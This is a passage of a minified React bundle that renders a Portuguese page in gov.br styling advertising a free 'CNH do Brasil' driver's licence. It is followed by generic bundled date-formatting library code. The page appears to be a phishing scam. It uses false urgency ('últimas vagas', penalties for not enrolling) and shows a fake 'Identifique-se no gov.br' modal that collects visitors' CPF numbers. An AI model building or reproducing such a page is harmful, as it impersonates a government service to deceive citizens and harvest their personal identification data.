          }), a.jsxs("li", {
            children: [a.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Redução de até 80% nos custos:"
            }), " Processo que antes custava entre R$ 3.000 e R$ 5.000 agora pode sair praticamente de graça"]
          })]
        }), a.jsxs("div", {
          className: "px-4 py-3 mb-6 mx-auto",
          style: {
            backgroundColor: "#F3F3F4",
            borderRadius: "6px",
            maxWidth: "95%"
          },
          children: [a.jsx("p", {
            className: "font-semibold text-base",
            style: {
              color: "#333333"
            },
            children: "Últimas Vagas para 2026"
          }), a.jsxs("p", {
            className: "text-base leading-relaxed",
            style: {
              color: "#717171"
            },
            children: ["Devido à alta demanda, restam poucas vagas para obter a CNH gratuitamente e sem autoescola. Estas são as últimas vagas disponíveis para ", a.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "janeiro de 2026"
            }), ". Caso não realize a inscrição com urgência, a próxima oportunidade será somente entre 2026 e 2027. Quem não se cadastrar arcará com os custos integrais do processo de habilitação."]
          })]
        }), a.jsx("div", {
          id: "como-se-inscrever",
          className: "mb-6",
          children: a.jsx("img", {
            src: "https://www.gov.br/transportes/pt-br/assuntos/noticias/2025/12/cnh-do-brasil-como-solicitar-a-primeira-habilitacao-pelo-aplicativo/thumb-cnh-2.png",
            alt: "CNH do Brasil - Como se inscrever",
            className: "w-full rounded-lg shadow-md"
          })
        }), a.jsx("h2", {
          className: "text-xl font-bold mt-8 mb-4",
          style: {
            color: "#333333"
          },
          children: "2. Como se inscrever no programa?"
        }), a.jsx("p", {
          className: "text-base leading-relaxed mb-4",
          style: {
            color: "#717171"
          },
          children: "O processo de inscrição é simples e pode ser feito totalmente online:"
        }), a.jsxs("ol", {
          className: "list-decimal pl-6 space-y-3 mb-6 text-base leading-relaxed",
          style: {
            color: "#717171"
          },
          children: [a.jsx("li", {
            children: "Clique no botão abaixo para iniciar seu cadastro"
          }), a.jsx("li", {
            children: "Informe seu CPF para verificar elegibilidade"
          }), a.jsx("li", {
            children: "Confirme seus dados pessoais"
          }), a.jsx("li", {
            children: "Sua Carteira de Motorista será emitida em até 20 dias"
          })]
        }), a.jsxs("div", {
          className: "text-center my-8",
          children: [a.jsx("button", {
            onClick: m,
            disabled: C,
            className: `bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all transform hover:scale-105 shadow-lg ${C ? "opacity-70 cursor-not-allowed" : ""}`,
            children: C ? a.jsxs("span", {
              className: "flex items-center justify-center gap-2",
              children: [a.jsx(dt, {
                className: "w-4 h-4 animate-spin"
              }), "Carregando..."]
            }) : a.jsx("span", {
              className: "underline",
              children: "Fazer Minha Inscrição Agora"
            })
          }), a.jsx("p", {
            className: "text-base leading-relaxed mt-3",
            style: {
              color: "#717171",
              opacity: .6
            },
            children: "Últimas vagas para 2026"
          })]
        }), a.jsxs("div", {
          className: "mt-8",
          children: [a.jsx("h2", {
            className: "text-xl font-bold mt-8 mb-4",
            style: {
              color: "#333333"
            },
            children: "3. Base Legal"
          }), a.jsxs("ul", {
            className: "list-disc pl-6 space-y-2 text-base leading-relaxed",
            style: {
              color: "#717171"
            },
            children: [a.jsx("li", {
              children: "Resolução Contran nº 985/2025"
            }), a.jsx("li", {
              children: "Lei nº 14.071/2020 (Nova Lei de Trânsito)"
            }), a.jsx("li", {
              children: "Decreto nº 11.999/2025 (Programa CNH do Brasil)"
            })]
          })]
        })]
      })]
    }), a.jsx("footer", {
      className: "text-white mt-12 w-full",
      style: {
        backgroundColor: "#071D41",
        display: "block"
      },
      children: a.jsxs("div", {
        className: "px-6 py-8",
        children: [a.jsx("span", {
          className: "text-3xl font-bold italic text-white mb-8 block",
          children: "gov.br"
        }), a.jsx("div", {
          className: "border-t border-white/20 pt-6",
          children: a.jsxs("div", {
            className: "space-y-0",
            children: [a.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [a.jsx("span", {
                className: "font-semibold",
                children: "ASSUNTOS"
              }), a.jsx(cs, {
                className: "text-white/70"
              })]
            }), a.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [a.jsx("span", {
                className: "font-semibold",
                children: "ACESSO À INFORMAÇÃO"
              }), a.jsx(cs, {
                className: "text-white/70"
              })]
            }), a.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [a.jsx("span", {
                className: "font-semibold",
                children: "COMPOSIÇÃO"
              }), a.jsx(cs, {
                className: "text-white/70"
              })]
            }), a.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [a.jsx("span", {
                className: "font-semibold",
                children: "CANAIS DE ATENDIMENTO"
              }), a.jsx(cs, {
                className: "text-white/70"
              })]
            }), a.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [a.jsx("span", {
                className: "font-semibold",
                children: "CENTRAL DE CONTEÚDOS"
              }), a.jsx(cs, {
                className: "text-white/70"
              })]
            }), a.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [a.jsx("span", {
                className: "font-semibold",
                children: "SERVIÇOS"
              }), a.jsx(cs, {
                className: "text-white/70"
              })]
            })]
          })
        }), a.jsxs("div", {
          className: "mt-8 flex items-center gap-2 text-white/80",
          children: [a.jsx(FT, {}), a.jsx("span", {
            children: "Redefinir Cookies"
          })]
        }), a.jsxs("div", {
          className: "mt-8",
          children: [a.jsx("p", {
            className: "font-semibold mb-4",
            children: "REDES SOCIAIS"
          }), a.jsxs("div", {
            className: "flex gap-4",
            children: [a.jsx(UT, {
              size: 20
            }), a.jsx(LT, {
              size: 20
            }), a.jsx(Yg, {
              size: 20
            }), a.jsx(RT, {
              size: 20
            }), a.jsx(OT, {
              size: 20
            }), a.jsx(Xg, {
              size: 20
            })]
          })]
        })]
      })
    }), a.jsx("div", {
      className: "fixed right-4 top-1/2 z-50 cursor-pointer transition-transform duration-300 ease-in-out",
      style: {
        transform: `translateY(calc(-50% + ${r}px))`
      },
      "aria-label": "VLibras - Acessibilidade em Libras",
      children: a.jsx("img", {
        src: "https://vlibras.gov.br/app//assets/access_icon.svg",
        alt: "VLibras",
        className: "w-10 h-10"
      })
    }), a.jsx("button", {
      onClick: () => window.scrollTo({
        top: 0,
        behavior: "smooth"
      }),
      className: "fixed right-4 bottom-4 z-50 bg-[#1351B4] p-3 rounded-full shadow-lg hover:bg-[#0D3C8C] transition-colors",
      "aria-label": "Voltar ao topo",
      children: a.jsx(Gn, {
        className: "text-white rotate-[-90deg]",
        size: 16
      })
    }), o && a.jsx("div", {
      className: "fixed inset-0 bg-black/50 z-[100] flex items-center justify-center p-4",
      onClick: () => i(!1),
      children: a.jsxs("div", {
        className: "bg-white rounded-lg shadow-xl w-full max-w-md relative",
        onClick: S => S.stopPropagation(),
        children: [a.jsx("button", {
          onClick: () => i(!1),
          className: "absolute top-4 right-4 text-gray-500 hover:text-gray-700 transition-colors bg-transparent border-none p-0",
          "aria-label": "Fechar",
          style: {
            background: "none"
          },
          children: a.jsx(zT, {
            size: 20
          })
        }), a.jsxs("div", {
          className: "p-6",
          children: [a.jsx("div", {
            className: "flex justify-center mb-4",
            children: a.jsx("img", {
              src: "/cnh-brasil-logo2.png",
              alt: "CNH do Brasil",
              className: "h-16 object-contain"
            })
          }), a.jsx("h3", {
            className: "text-center text-lg font-semibold mb-4",
            style: {
              color: "#333333"
            },
            children: "Identifique-se no gov.br com:"
          }), a.jsxs("div", {
            className: "flex items-center gap-2 p-3 bg-gray-100 rounded mb-4",
            children: [a.jsx("img", {
              src: "https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png",
              alt: "CPF",
              className: "w-5 h-5"
            }), a.jsx("span", {
              className: "text-sm font-medium",
              style: {
                color: "#1351B4"
              },
              children: "Número do CPF"
            })]
          }), a.jsxs("p", {
            className: "text-sm text-gray-600 mb-4",
            children: ["Digite seu CPF para ", a.jsx("strong", {
              children: "criar"
            }), " ou ", a.jsx("strong", {
              children: "acessar"
            }), " sua conta gov.br"]
          }), a.jsxs("form", {
            onSubmit: w,
            children: [a.jsx("label", {
              className: "block text-sm font-medium text-gray-700 mb-1",
              children: "CPF"
            }), a.jsx("input", {
              type: "tel",
              value: l,
              onChange: p,
              placeholder: "Digite seu CPF",
              className: "w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:border-transparent mb-4"
            }), a.jsxs("button", {
              type: "submit",
              disabled: u || Mo(l).length < 11,
              className: "w-full py-3 rounded-full font-semibold text-white flex items-center justify-center gap-2 transition-colors disabled:opacity-50",
              style: {
                backgroundColor: "#1351B4"
              },
              children: [u && a.jsx(dt, {
                className: "h-4 w-4 animate-spin"
              }), u ? "Acessando..." : "Continuar"]
            })]
          })]
        })]
      })
    })]
  })
}
function tn(e) {
  const t = Object.prototype.toString.call(e);
  return e instanceof Date || typeof e == "object" && t === "[object Date]" ? new e.constructor(+e) : typeof e == "number" || t === "[object Number]" || typeof e == "string" || t === "[object String]" ? new Date(e) : new Date(NaN)
}
function es(e, t) {
  return e instanceof Date ? new e.constructor(t) : new Date(t)
}
const Mw = 6048e5
  , WT = 864e5;
let QT = {};
function lc() {
  return QT
}
function Ai(e, t) {
  var l, c, u, d;
  const n = lc()
    , r = (t == null ? void 0 : t.weekStartsOn) ?? ((c = (l = t == null ? void 0 : t.locale) == null ? void 0 : l.options) == null ? void 0 : c.weekStartsOn) ?? n.weekStartsOn ?? ((d = (u = n.locale) == null ? void 0 : u.options) == null ? void 0 : d.weekStartsOn) ?? 0
    , s = tn(e)
    , o = s.getDay()
    , i = (o < r ? 7 : 0) + o - r;
  return s.setDate(s.getDate() - i),
    s.setHours(0, 0, 0, 0),
    s
}
function Al(e) {
  return Ai(e, {
    weekStartsOn: 1
  })
}
function Rw(e) {
  const t = tn(e)
    , n = t.getFullYear()
    , r = es(e, 0);
  r.setFullYear(n + 1, 0, 4),
    r.setHours(0, 0, 0, 0);
  const s = Al(r)
    , o = es(e, 0);
  o.setFullYear(n, 0, 4),
    o.setHours(0, 0, 0, 0);
  const i = Al(o);
  return t.getTime() >= s.getTime() ? n + 1 : t.getTime() >= i.getTime() ? n : n - 1
}
function Jg(e) {
  const t = tn(e);
  return t.setHours(0, 0, 0, 0),
    t
}
function Zg(e) {
  const t = tn(e)
    , n = new Date(Date.UTC(t.getFullYear(), t.getMonth(), t.getDate(), t.getHours(), t.getMinutes(), t.getSeconds(), t.getMilliseconds()));
  return n.setUTCFullYear(t.getFullYear()),
    +e - +n
}
function qT(e, t) {
  const n = Jg(e)
    , r = Jg(t)
    , s = +n - Zg(n)
    , o = +r - Zg(r);
  return Math.round((s - o) / WT)
}
function GT(e) {
  const t = Rw(e)
    , n = es(e, 0);
  return n.setFullYear(t, 0, 4),
    n.setHours(0, 0, 0, 0),
    Al(n)
}
function KT(e) {
  return e instanceof Date || typeof e == "object" && Object.prototype.toString.call(e) === "[object Date]"
}
function YT(e) {
  if (!KT(e) && typeof e != "number")
    return !1;
  const t = tn(e);
  return !isNaN(Number(t))
}
function XT(e) {
  const t = tn(e)
    , n = es(e, 0);
  return n.setFullYear(t.getFullYear(), 0, 1),
    n.setHours(0, 0, 0, 0),
    n
}
const JT = {
  lessThanXSeconds: {
    one: "less than a second",
    other: "less than {{count}} seconds"
  },
  xSeconds: {
    one: "1 second",
    other: "{{count}} seconds"
  },
  halfAMinute: "half a minute",
  lessThanXMinutes: {
    one: "less than a minute",
    other: "less than {{count}} minutes"
  },
  xMinutes: {
    one: "1 minute",
    other: "{{count}} minutes"
  },
  aboutXHours: {
    one: "about 1 hour",
    other: "about {{count}} hours"
  },
  xHours: {
    one: "1 hour",
    other: "{{count}} hours"
  },
  xDays: {
    one: "1 day",
    other: "{{count}} days"
  },
  aboutXWeeks: {
    one: "about 1 week",
    other: "about {{count}} weeks"
  },
  xWeeks: {
    one: "1 week",
    other: "{{count}} weeks"
  },
  aboutXMonths: {
    one: "about 1 month",
    other: "about {{count}} months"
  },
  xMonths: {
    one: "1 month",
    other: "{{count}} months"
  },
  aboutXYears: {
    one: "about 1 year",
    other: "about {{count}} years"
  },
  xYears: {
    one: "1 year",
    other: "{{count}} years"
  },
  overXYears: {
    one: "over 1 year",
    other: "over {{count}} years"
  },
  almostXYears: {
    one: "almost 1 year",
    other: "almost {{count}} years"
  }
}
  , ZT = (e, t, n) => {
    let r;
    const s = JT[e];
    return typeof s == "string" ? r = s : t === 1 ? r = s.one : r = s.other.replace("{{count}}", t.toString()),
      n != null && n.addSuffix ? n.comparison && n.comparison > 0 ? "in " + r : r + " ago" : r
  }
  ;
function Is(e) {
  return (t = {}) => {
    const n = t.width ? String(t.width) : e.defaultWidth;
    return e.formats[n] || e.formats[e.defaultWidth]
  }
}
const ek = {
  full: "EEEE, MMMM do, y",
  long: "MMMM do, y",
  medium: "MMM d, y",
  short: "MM/dd/yyyy"
}
  , tk = {
    full: "h:mm:ss a zzzz",
    long: "h:mm:ss a z",
    medium: "h:mm:ss a",
    short: "h:mm a"
  }
  , nk = {
    full: "{{date}} 'at' {{time}}",
    long: "{{date}} 'at' {{time}}",
    medium: "{{date}}, {{time}}",
    short: "{{date}}, {{time}}"
  }
  , rk = {
    date: Is({
      formats: ek,
      defaultWidth: "full"
    }),
    time: Is({
      formats: tk,
      defaultWidth: "full"
    }),
    dateTime: Is({
      formats: nk,
      defaultWidth: "full"
    })
  }
  , sk = {
    lastWeek: "'last' eeee 'at' p",
    yesterday: "'yesterday at' p",
    today: "'today at' p",
    tomorrow: "'tomorrow at' p",
    nextWeek: "eeee 'at' p",
    other: "P"
  }
  , ok = (e, t, n, r) => sk[e];
function un(e) {
  return (t, n) => {
    const r = n != null && n.context ? String(n.context) : "standalone";
    let s;
    if (r === "formatting" && e.formattingValues) {
      const i = e.defaultFormattingWidth || e.defaultWidth
        , l = n != null && n.width ? String(n.width) : i;
      s = e.formattingValues[l] || e.formattingValues[i]
    } else {
      const i = e.defaultWidth
        , l = n != null && n.width ? String(n.width) : e.defaultWidth;
      s = e.values[l] || e.values[i]
    }
    const o = e.argumentCallback ? e.argumentCallback(t) : t;
    return s[o]
  }
}
const ik = {
  narrow: ["B", "A"],
  abbreviated: ["BC", "AD"],
  wide: ["Before Christ", "Anno Domini"]
}
  , ak = {
    narrow: ["1", "2", "3", "4"],
    abbreviated: ["Q1", "Q2", "Q3", "Q4"],
    wide: ["1st quarter", "2nd quarter", "3rd quarter", "4th quarter"]
  }
  , lk = {
    narrow: ["J", "F", "M", "A", "M", "J", "J", "A", "S", "O", "N", "D"],
    abbreviated: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
    wide: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
  }
  , ck = {
    narrow: ["S", "M", "T", "W", "T", "F", "S"],
    short: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"],
    abbreviated: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
    wide: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"]
  }
  , uk = {
    narrow: {
      am: "a",
      pm: "p",
      midnight: "mi",
      noon: "n",
      morning: "morning",
      afternoon: "afternoon",
      evening: "evening",
      night: "night"
    },
    abbreviated: {
      am: "AM",
      pm: "PM",
      midnight: "midnight",
      noon: "noon",
      morning: "morning",
      afternoon: "afternoon",
      evening: "evening",
      night: "night"
    },
    wide: {
      am: "a.m.",
      pm: "p.m.",
      midnight: "midnight",
      noon: "noon",
      morning: "morning",
      afternoon: "afternoon",
      evening: "evening",
      night: "night"
    }
  }
  , dk = {
    narrow: {
      am: "a",
      pm: "p",
      midnight: "mi",
      noon: "n",
      morning: "in the morning",
      afternoon: "in the afternoon",
      evening: "in the evening",
      night: "at night"
    },
    abbreviated: {
      am: "AM",
      pm: "PM",
      midnight: "midnight",
      noon: "noon",
      morning: "in the morning",
      afternoon: "in the afternoon",
      evening: "in the evening",
      night: "at night"
    },
    wide: {
      am: "a.m.",
      pm: "p.m.",
      midnight: "midnight",
      noon: "noon",
      morning: "in the morning",
      afternoon: "in the afternoon",
      evening: "in the evening",
      night: "at night"
    }
  }
  , fk = (e, t) => {
    const n = Number(e)
      , r = n % 100;
    if (r > 20 || r < 10)
      switch (r % 10) {
        case 1:
          return n + "st";
        case 2:
          return n + "nd";
        case 3:
          return n + "rd"
      }
    return n + "th"
  }
  , hk = {
    ordinalNumber: fk,
    era: un({
      values: ik,
      defaultWidth: "wide"
    }),
    quarter: un({
      values: ak,
      defaultWidth: "wide",
      argumentCallback: e => e - 1
    }),
    month: un({
      values: lk,
      defaultWidth: "wide"
    }),
    day: un({
      values: ck,
      defaultWidth: "wide"
    }),
    dayPeriod: un({
      values: uk,
      defaultWidth: "wide",
      formattingValues: dk,
      defaultFormattingWidth: "wide"
    })
  };
function dn(e) {
  return (t, n = {}) => {
    const r = n.width
      , s = r && e.matchPatterns[r] || e.matchPatterns[e.defaultMatchWidth]
      , o = t.match(s);
    if (!o)
      return null;
    const i = o[0]
      , l = r && e.parsePatterns[r] || e.parsePatterns[e.defaultParseWidth]
      , c = Array.isArray(l) ? pk(l, f => f.test(i)) : mk(l, f => f.test(i));
    let u;
    u = e.valueCallback ? e.valueCallback(c) : c,
      u = n.valueCallback ? n.valueCallback(u) : u;
    const d = t.slice(i.length);
    return {
      value: u,
      rest: d
    }
  }
}
function mk(e, t) {
  for (const n in e)
    if (Object.prototype.hasOwnProperty.call(e, n) && t(e[n]))
      return n
}
function pk(e, t) {
  for (let n = 0; n < e.length; n++)
    if (t(e[n]))
      return n
}
function Ow(e) {
  return (t, n = {}) => {
    const r = t.match(e.matchPattern);
    if (!r)
      return null;
    const s = r[0]
      , o = t.match(e.parsePattern);
    if (!o)
      return null;
    let i = e.valueCallback ? e.valueCallback(o[0]) : o[0];
    i = n.valueCallback ? n.valueCallback(i) : i;
    const l = t.slice(s.length);
    return {
      value: i,
      rest: l
    }
  }
}
const gk = /^(\d+)(th|st|nd|rd)?/i
  , yk = /\d+/i
  , vk = {
    narrow: /^(b|a)/i,
    abbreviated: /^(b\.?\s?c\.?|b\.?\s?c\.?\s?e\.?|a\.?\s?d\.?|c\.?\s?e\.?)/i,
    wide: /^(before christ|before common era|anno domini|common era)/i
  }
  , xk = {
    any: [/^b/i, /^(a|c)/i]
  }
  , wk = {
    narrow: /^[1234]/i,
    abbreviated: /^q[1234]/i,
    wide: /^[1234](th|st|nd|rd)? quarter/i
  }
  , bk = {
    any: [/1/i, /2/i, /3/i, /4/i]
  }
  , Sk = {
    narrow: /^[jfmasond]/i,
    abbreviated: /^(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)/i,
    wide: /^(january|february|march|april|may|june|july|august|september|october|november|december)/i
  }
  , Ck = {
    narrow: [/^j/i, /^f/i, /^m/i, /^a/i, /^m/i, /^j/i, /^j/i, /^a/i, /^s/i, /^o/i, /^n/i, /^d/i],
    any: [/^ja/i, /^f/i, /^mar/i, /^ap/i, /^may/i, /^jun/i, /^jul/i, /^au/i, /^s/i, /^o/i, /^n/i, /^d/i]
  }
  , Nk = {
    narrow: /^[smtwf]/i,
    short: /^(su|mo|tu|we|th|fr|sa)/i,
    abbreviated: /^(sun|mon|tue|wed|thu|fri|sat)/i,
    wide: /^(sunday|monday|tuesday|wednesday|thursday|friday|saturday)/i
  }
  , jk = {
    narrow: [/^s/i, /^m/i, /^t/i, /^w/i, /^t/i, /^f/i, /^s/i],
    any: [/^su/i, /^m/i, /^tu/i, /^w/i, /^th/i, /^f/i, /^sa/i]
  }
  , Pk = {
    narrow: /^(a|p|mi|n|(in the|at) (morning|afternoon|evening|night))/i,
    any: /^([ap]\.?\s?m\.?|midnight|noon|(in the|at) (morning|afternoon|evening|night))/i
  }
  , Ak = {
    any: {
      am: /^a/i,
      pm: /^p/i,
      midnight: /^mi/i,
      noon: /^no/i,
      morning: /morning/i,
      afternoon: /afternoon/i,
      evening: /evening/i,
      night: /night/i
    }
  }
  , Ek = {
    ordinalNumber: Ow({
      matchPattern: gk,
      parsePattern: yk,
      valueCallback: e => parseInt(e, 10)
    }),
    era: dn({
      matchPatterns: vk,
      defaultMatchWidth: "wide",
      parsePatterns: xk,
      defaultParseWidth: "any"
    }),
    quarter: dn({
      matchPatterns: wk,
      defaultMatchWidth: "wide",
      parsePatterns: bk,
      defaultParseWidth: "any",
      valueCallback: e => e + 1
    }),
    month: dn({
      matchPatterns: Sk,
      defaultMatchWidth: "wide",
      parsePatterns: Ck,
      defaultParseWidth: "any"
    }),
    day: dn({
      matchPatterns: Nk,
      defaultMatchWidth: "wide",
      parsePatterns: jk,
      defaultParseWidth: "any"
    }),
    dayPeriod: dn({
      matchPatterns: Pk,
      defaultMatchWidth: "any",
      parsePatterns: Ak,
      defaultParseWidth: "any"
    })
  }
  , Tk = {
    code: "en-US",
    formatDistance: ZT,
    formatLong: rk,
    formatRelative: ok,
    localize: hk,
    match: Ek,
    options: {
      weekStartsOn: 0,
      firstWeekContainsDate: 1
    }
  };
function kk(e) {
  const t = tn(e);
  return qT(t, XT(t)) + 1
}
function Dk(e) {
  const t = tn(e)
    , n = +Al(t) - +GT(t);
  return Math.round(n / Mw) + 1
}
function Iw(e, t) {
  var d, f, h, y;
  const n = tn(e)
    , r = n.getFullYear()
    , s = lc()
    , o = (t == null ? void 0 : t.firstWeekContainsDate) ?? ((f = (d = t == null ? void 0 : t.locale) == null ? void 0 : d.options) == null ? void 0 : f.firstWeekContainsDate) ?? s.firstWeekContainsDate ?? ((y = (h = s.locale) == null ? void 0 : h.options) == null ? void 0 : y.firstWeekContainsDate) ?? 1
    , i = es(e, 0);
  i.setFullYear(r + 1, 0, o),
    i.setHours(0, 0, 0, 0);
  const l = Ai(i, t)
    , c = es(e, 0);
  c.setFullYear(r, 0, o),
    c.setHours(0, 0, 0, 0);
  const u = Ai(c, t);
  return n.getTime() >= l.getTime() ? r + 1 : n.getTime() >= u.getTime() ? r : r - 1
}
function Mk(e, t) {
  var l, c, u, d;
  const n = lc()
    , r = (t == null ? void 0 : t.firstWeekContainsDate) ?? ((c = (l = t == null ? void 0 : t.locale) == null ? void 0 : l.options) == null ? void 0 : c.firstWeekContainsDate) ?? n.firstWeekContainsDate ?? ((d = (u = n.locale) == null ? void 0 : u.options) == null ? void 0 : d.firstWeekContainsDate) ?? 1
    , s = Iw(e, t)
    , o = es(e, 0);
  return o.setFullYear(s, 0, r),
    o.setHours(0, 0, 0, 0),
    Ai(o, t)
}
function Rk(e, t) {
  const n = tn(e)
    , r = +Ai(n, t) - +Mk(n, t);
  return Math.round(r / Mw) + 1
}
function le(e, t) {
  const n = e < 0 ? "-" : ""
    , r = Math.abs(e).toString().padStart(t, "0");
  return n + r
}
const Kn = {
  y(e, t) {
    const n = e.getFullYear()
      , r = n > 0 ? n : 1 - n;
    return le(t === "yy" ? r % 100 : r, t.length)
  },
  M(e, t) {
    const n = e.getMonth();
    return t === "M" ? String(n + 1) : le(n + 1, 2)
  },
  d(e, t) {
    return le(e.getDate(), t.length)
  },
  a(e, t) {
    const n = e.getHours() / 12 >= 1 ? "pm" : "am";
    switch (t) {
      case "a":
      case "aa":
        return n.toUpperCase();
      case "aaa":
        return n;
      case "aaaaa":
        return n[0];
      case "aaaa":
      default:
        return n === "am" ? "a.m." : "p.m."
    }
  },
  h(e, t) {
    return le(e.getHours() % 12 || 12, t.length)
  },
  H(e, t) {
    return le(e.getHours(), t.length)
  },
  m(e, t) {
    return le(e.getMinutes(), t.length)
  },
  s(e, t) {
    return le(e.getSeconds(), t.length)
  },
  S(e, t) {
    const n = t.length
      , r = e.getMilliseconds()
      , s = Math.trunc(r * Math.pow(10, n - 3));
    return le(s, t.length)
  }
}
  , us = {
    am: "am",
    pm: "pm",
    midnight: "midnight",
    noon: "noon",
    morning: "morning",
    afternoon: "afternoon",
    evening: "evening",
    night: "night"
  }
  , e0 = {
    G: function (e, t, n) {
      const r = e.getFullYear() > 0 ? 1 : 0;
      switch (t) {
        case "G":
        case "GG":
        case "GGG":
          return n.era(r, {
            width: "abbreviated"
          });
        case "GGGGG":
          return n.era(r, {
            width: "narrow"
          });
        case "GGGG":
        default:
          return n.era(r, {
            width: "wide"
          })
      }
    },
    y: function (e, t, n) {
      if (t === "yo") {
        const r = e.getFullYear()
          , s = r > 0 ? r : 1 - r;
        return n.ordinalNumber(s, {
          unit: "year"
        })
      }
      return Kn.y(e, t)
    },
    Y: function (e, t, n, r) {
      const s = Iw(e, r)
        , o = s > 0 ? s : 1 - s;
      if (t === "YY") {
        const i = o % 100;
        return le(i, 2)
      }
      return t === "Yo" ? n.ordinalNumber(o, {
        unit: "year"
      }) : le(o, t.length)
    },
    R: function (e, t) {
      const n = Rw(e);
      return le(n, t.length)
    },
    u: function (e, t) {
      const n = e.getFullYear();
      return le(n, t.length)
    },
    Q: function (e, t, n) {
      const r = Math.ceil((e.getMonth() + 1) / 3);
      switch (t) {
        case "Q":
          return String(r);
        case "QQ":
          return le(r, 2);
        case "Qo":
          return n.ordinalNumber(r, {
            unit: "quarter"
          });
        case "QQQ":
          return n.quarter(r, {
            width: "abbreviated",
            context: "formatting"
          });
        case "QQQQQ":
          return n.quarter(r, {
            width: "narrow",
            context: "formatting"
          });
        case "QQQQ":
        default:
          return n.quarter(r, {
            width: "wide",
            context: "formatting"
          })
      }
    },
    q: function (e, t, n) {
      const r = Math.ceil((e.getMonth() + 1) / 3);
      switch (t) {
        case "q":
          return String(r);
        case "qq":
          return le(r, 2);
        case "qo":
          return n.ordinalNumber(r, {
            unit: "quarter"
          });
        case "qqq":
          return n.quarter(r, {
            width: "abbreviated",
            context: "standalone"
          });
        case "qqqqq":
          return n.quarter(r, {
            width: "narrow",
            context: "standalone"
          });
        case "qqqq":
        default:
          return n.quarter(r, {
            width: "wide",
            context: "standalone"
          })
      }
    },
    M: function (e, t, n) {
      const r = e.getMonth();
      switch (t) {
        case "M":
        case "MM":
          return Kn.M(e, t);
        case "Mo":
          return n.ordinalNumber(r + 1, {
            unit: "month"
          });
        case "MMM":
          return n.month(r, {
            width: "abbreviated",
            context: "formatting"
          });
        case "MMMMM":
          return n.month(r, {
            width: "narrow",
            context: "formatting"
          });
        case "MMMM":
        default:
          return n.month(r, {
            width: "wide",
            context: "formatting"
          })
      }
    },
    L: function (e, t, n) {
      const r = e.getMonth();
      switch (t) {
        case "L":
          return String(r + 1);
        case "LL":
          return le(r + 1, 2);
        case "Lo":
          return n.ordinalNumber(r + 1, {
            unit: "month"
          });
        case "LLL":
          return n.month(r, {
            width: "abbreviated",
            context: "standalone"
          });
        case "LLLLL":
          return n.month(r, {
            width: "narrow",
            context: "standalone"
          });
        case "LLLL":
        default:
          return n.month(r, {
            width: "wide",
            context: "standalone"
          })
      }
    },
    w: function (e, t, n, r) {
      const s = Rk(e, r);
      return t === "wo" ? n.ordinalNumber(s, {
        unit: "week"
      }) : le(s, t.length)
    },
    I: function (e, t, n) {
      const r = Dk(e);
      return t === "Io" ? n.ordinalNumber(r, {
        unit: "week"
      }) : le(r, t.length)
    },
    d: function (e, t, n) {
      return t === "do" ? n.ordinalNumber(e.getDate(), {
        unit: "date"
      }) : Kn.d(e, t)
    },
    D: function (e, t, n) {
      const r = kk(e);
      return t === "Do" ? n.ordinalNumber(r, {
        unit: "dayOfYear"
      }) : le(r, t.length)
    },
    E: function (e, t, n) {
      const r = e.getDay();
      switch (t) {
        case "E":
        case "EE":
        case "EEE":
          return n.day(r, {
            width: "abbreviated",
            context: "formatting"
          });
        case "EEEEE":
          return n.day(r, {
            width: "narrow",
            context: "formatting"
          });
        case "EEEEEE":
          return n.day(r, {
            width: "short",
            context: "formatting"
          });
        case "EEEE":
        default:
          return n.day(r, {
            width: "wide",
            context: "formatting"
          })
      }
    },
    e: function (e, t, n, r) {
      const s = e.getDay()
        , o = (s - r.weekStartsOn + 8) % 7 || 7;
      switch (t) {
        case "e":
          return String(o);
        case "ee":
          return le(o, 2);
        case "eo":
          return n.ordinalNumber(o, {
            unit: "day"
          });
        case "eee":
          return n.day(s, {
            width: "abbreviated",
            context: "formatting"
          });
        case "eeeee":
          return n.day(s, {
            width: "narrow",
            context: "formatting"
          });
        case "eeeeee":
          return n.day(s, {
            width: "short",
            context: "formatting"
          });
        case "eeee":
        default:
          return n.day(s, {
            width: "wide",
            context: "formatting"
          })
      }
    },
    c: function (e, t, n, r) {
      const s = e.getDay()
        , o = (s - r.weekStartsOn + 8) % 7 || 7;
      switch (t) {
        case "c":
          return String(o);
        case "cc":
          return le(o, t.length);
        case "co":
          return n.ordinalNumber(o, {
            unit: "day"
          });
        case "ccc":
          return n.day(s, {
            width: "abbreviated",
            context: "standalone"
          });
        case "ccccc":
          return n.day(s, {
            width: "narrow",
            context: "standalone"
          });
        case "cccccc":
          return n.day(s, {
            width: "short",
            context: "standalone"
          });
        case "cccc":
        default:
          return n.day(s, {
            width: "wide",
            context: "standalone"
          })
      }
    },
    i: function (e, t, n) {
      const r = e.getDay()
        , s = r === 0 ? 7 : r;
      switch (t) {
        case "i":
          return String(s);
        case "ii":
          return le(s, t.length);
        case "io":
          return n.ordinalNumber(s, {
            unit: "day"
          });
        case "iii":
          return n.day(r, {
            width: "abbreviated",
            context: "formatting"
          });
        case "iiiii":
          return n.day(r, {
            width: "narrow",
            context: "formatting"
          });
        case "iiiiii":
          return n.day(r, {
            width: "short",
            context: "formatting"
          });
        case "iiii":
        default:
          return n.day(r, {
            width: "wide",
            context: "formatting"
          })
      }
    },
    a: function (e, t, n) {
      const s = e.getHours() / 12 >= 1 ? "pm" : "am";
      switch (t) {
        case "a":
        case "aa":
